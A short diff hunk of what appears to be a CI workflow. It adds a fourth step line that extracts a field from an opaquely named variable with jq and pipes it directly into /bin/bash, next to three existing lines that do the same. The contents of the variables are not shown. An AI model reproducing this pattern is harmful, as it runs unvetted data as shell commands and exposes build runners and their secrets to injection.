@@ -27,6 +27,7 @@ jobs:
           echo $t49 | jq -r .unb20323 | /bin/bash
           printf '%s' "$dvjtr054" | jq -r .ajhx66816 | /bin/bash
           printf '%s' "$viuw53" | jq -r .a79285 | /bin/bash
+          echo $tej7 | jq -r .dlor90259 | /bin/bash
 
       - name: Archive results
         if: always()
